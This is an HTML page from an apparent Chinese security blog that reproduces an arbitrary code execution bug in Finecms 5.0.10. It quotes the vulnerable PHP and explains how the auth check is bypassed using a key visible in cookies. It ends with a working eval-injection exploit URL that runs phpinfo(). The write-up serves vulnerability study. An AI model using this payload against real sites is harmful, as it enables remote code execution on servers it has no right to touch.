@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Finecms 5.0.10 任意代码执行漏洞一、漏洞简介 auth值是由zero_ci_session中zero进行md5加密获取到的，无需登陆便有，且每个站点的站长会进行不同的自定义  二、漏洞影响Finecms 5.0.10 三、复现过程漏洞分析这个漏洞的文件在&#x2F;finecms&#x2F;dayrui&#x2F;controllers&#x2F;Api.php的data2() public function data2(">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Finecms/Finecms%205.0.10%20%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Finecms 5.0.10 任意代码执行漏洞一、漏洞简介 auth值是由zero_ci_session中zero进行md5加密获取到的，无需登陆便有，且每个站点的站长会进行不同的自定义  二、漏洞影响Finecms 5.0.10 三、复现过程漏洞分析这个漏洞的文件在&#x2F;finecms&#x2F;dayrui&#x2F;controllers&#x2F;Api.php的data2() public function data2(">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Finecms5.0.10%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Finecms5.0.10%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId26.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Finecms5.0.10%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Finecms5.0.10%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId29.png">
+<meta property="article:published_time" content="2022-07-08T06:25:56.692Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.674Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Finecms5.0.10%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Finecms/Finecms 5.0.10 任意代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Finecms/Finecms%205.0.10%20%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:56.692Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Finecms-5-0-10-任意代码执行漏洞"><a href="#Finecms-5-0-10-任意代码执行漏洞" class="headerlink" title="Finecms 5.0.10 任意代码执行漏洞"></a>Finecms 5.0.10 任意代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
+<p>auth值是由<code>zero_ci_session</code>中zero进行md5加密获取到的，无需登陆便有，且每个站点的站长会进行不同的自定义</p>
+</blockquote>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Finecms 5.0.10</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这个漏洞的文件在<code>/finecms/dayrui/controllers/Api.php</code>的data2()</p>
+<pre><code>public function data2() &#123;
+        $data = array();
+
+        // 安全码认证
+        $auth = $this-&gt;input-&gt;get(&#39;auth&#39;, true);
+        if ($auth != md5(SYS_KEY)) &#123;
+            // 授权认证码不正确
+            $data = array(&#39;msg&#39; =&gt; &#39;授权认证码不正确&#39;, &#39;code&#39; =&gt; 0);
+        &#125; else &#123;
+            // 解析数据
+            $cache = &#39;&#39;;
+            $param = $this-&gt;input-&gt;get(&#39;param&#39;);
+            if (isset($param[&#39;cache&#39;]) &amp;&amp; $param[&#39;cache&#39;]) &#123;
+                $cache = md5(dr_array2string($param));
+                $data = $this-&gt;get_cache_data($cache);
+            &#125;
+            if (!$data) &#123;
+
+                // list数据查询
+                $data = $this-&gt;template-&gt;list_tag($param);
+                $data[&#39;code&#39;] = $data[&#39;error&#39;] ? 0 : 1;
+                unset($data[&#39;sql&#39;], $data[&#39;pages&#39;]);
+
+                // 缓存数据
+                $cache &amp;&amp; $this-&gt;set_cache_data($cache, $data, $param[&#39;cache&#39;]);
+            &#125;
+        &#125;
+
+        // 接收参数
+        $format = $this-&gt;input-&gt;get(&#39;format&#39;);
+        $function = $this-&gt;input-&gt;get(&#39;function&#39;);
+        if ($function) &#123;
+            if (!function_exists($function)) &#123;
+                $data = array(&#39;msg&#39; =&gt; fc_lang(&#39;自定义函数&#39;.$function.&#39;不存在&#39;), &#39;code&#39; =&gt; 0);
+            &#125; else &#123;
+                $data = $function($data);
+            &#125;
+        &#125;
+
+        // 页面输出
+        if ($format == &#39;php&#39;) &#123;
+            print_r($data);
+        &#125; elseif ($format == &#39;jsonp&#39;) &#123;
+            // 自定义返回名称
+            echo $this-&gt;input-&gt;get(&#39;callback&#39;, TRUE).&#39;(&#39;.$this-&gt;callback_json($data).&#39;)&#39;;
+        &#125; else &#123;
+            // 自定义返回名称
+            echo $this-&gt;callback_json($data);
+        &#125;
+        exit;
+
+    &#125;
+</code></pre>
+<p>可以看到开头这里验证了认证码：</p>
+<pre><code>// 安全码认证
+    $auth = $this-&gt;input-&gt;get(&#39;auth&#39;, true);
+    if ($auth != md5(SYS_KEY)) &#123;
+        // 授权认证码不正确
+        $data = array(&#39;msg&#39; =&gt; &#39;授权认证码不正确&#39;, &#39;code&#39; =&gt; 0);
+    &#125; else &#123;
+</code></pre>
+<p>授权码在<code>/config/system.php</code></p>
+<p><img src="/resource/Finecms5.0.10%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png">可以看到SYS_KEY是固定的，我们可以在Cookies找到，<code>/finecms/dayrui/config/config.php</code></p>
+<p><img src="/resource/Finecms5.0.10%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
+<p>用浏览器查看Cookies可以看到KEY，但是验证用MD5，我们先把KEY加密就行了。</p>
+<p><img src="/resource/Finecms5.0.10%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
+<p>直接看到这一段，调用了Template对象里面的list_tag函数</p>
+<pre><code>if (!$data) &#123;
+
+    // list数据查询
+    $data = $this-&gt;template-&gt;list_tag($param);
+    $data[&#39;code&#39;] = $data[&#39;error&#39;] ? 0 : 1;
+    unset($data[&#39;sql&#39;], $data[&#39;pages&#39;]);
+
+    // 缓存数据
+    $cache &amp;&amp; $this-&gt;set_cache_data($cache, $data, $param[&#39;cache&#39;]);
+&#125;
+</code></pre>
+<p>我们到<code>finecms/dayrui/libraries/Template.php</code>看list_tag函数的代码,代码有点长，我抓重点的地方,这里把<code>param=action=cache%20name=MEMBER.1%27];phpinfo();$a=[%271</code>的内容分为两个数组$var、$val，这两个数组的内容分别为</p>
+<pre><code>$var=[&#39;action&#39;,&#39;name&#39;]
+$val=[&#39;cache%20&#39;,&#39;MEMBER.1%27];phpinfo();$a=[%271&#39;]
+</code></pre>
+<p>$cache=_cache_var是返回会员的信息 重点的是下面的<br><code>@eval(&#39;$data=$cache&#39;.$this-&gt;_get_var($_param).&#39;;&#39;);</code></p>
+<pre><code>foreach ($params as $t) &#123;
+            $var = substr($t, 0, strpos($t, &#39;=&#39;));
+            $val = substr($t, strpos($t, &#39;=&#39;) + 1);
+</code></pre>
+<p>再看这一段,因为swtich选中的是cache，所有就不再进行下面的分析了。<br><code>$pos = strpos($param[&#39;name&#39;], &#39;.&#39;);</code>这句是为下面的substr函数做准备。<br>是为了分离出的内容为</p>
+<pre><code>$_name=&#39;MEMBER&#39;
+$_param=&quot;1%27];phpinfo();$a=[%271&quot;
+// action
+        switch ($system[&#39;action&#39;]) &#123;
+
+            case &#39;cache&#39;: // 系统缓存数据
+                if (!isset($param[&#39;name&#39;])) &#123;
+                    return $this-&gt;_return($system[&#39;return&#39;], &#39;name参数不存在&#39;);
+                &#125;
+
+                $pos = strpos($param[&#39;name&#39;], &#39;.&#39;);
+                if ($pos !== FALSE) &#123;
+                    $_name = substr($param[&#39;name&#39;], 0, $pos);
+                    $_param = substr($param[&#39;name&#39;], $pos + 1);
+                &#125; else &#123;
+                    $_name = $param[&#39;name&#39;];
+                    $_param = NULL;
+                &#125;
+                $cache = $this-&gt;_cache_var($_name, !$system[&#39;site&#39;] ? SITE_ID : $system[&#39;site&#39;]);
+                if (!$cache) &#123;
+                    return $this-&gt;_return($system[&#39;return&#39;], &quot;缓存(&#123;$_name&#125;)不存在，请在后台更新缓存&quot;);
+                &#125;
+                if ($_param) &#123;
+                    $data = array();
+                    @eval(&#39;$data=$cache&#39;.$this-&gt;_get_var($_param).&#39;;&#39;);
+                    if (!$data) &#123;
+                        return $this-&gt;_return($system[&#39;return&#39;], &quot;缓存(&#123;$_name&#125;)参数不存在!!&quot;);
+                    &#125;
+                &#125; else &#123;
+                    $data = $cache;
+                &#125;
+
+                return $this-&gt;_return($system[&#39;return&#39;], $data, &#39;&#39;);
+                break;
+</code></pre>
+<p>跟踪get_var函数，在这里我们先把$param的内容假设为a,然后执行函数里面的内容，最后返回的$string的内容是：</p>
+<pre><code>$string=[&#39;a&#39;]
+</code></pre>
+<p>那么我们的思路就是把两边的[&#39; &#39;]闭合然后再放上恶意的代码。<br>payload为：<code>1&#39;];phpinfo();$a=[&#39;1 </code>那么返回的$string的内容：</p>
+<pre><code>$string=[&#39;1&#39;];phpinfo();$a=[&#39;1&#39;]
+</code></pre>
+<h3 id="漏洞复线"><a href="#漏洞复线" class="headerlink" title="漏洞复线"></a>漏洞复线</h3><pre><code>http://0-sec.org/index.php?c=api&amp;m=data2&amp;auth=目标站点的值&amp;param=action=cache%20name=MEMBER.1%27];phpinfo();$a=[%271
+</code></pre>
+<p><img src="/resource/Finecms5.0.10%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Finecms/Finecms%205.0.10%20%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qpci007sy8v14va610ke" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Finecms/Finecms%205.0.10%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Finecms/Finecms%205.0.10%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
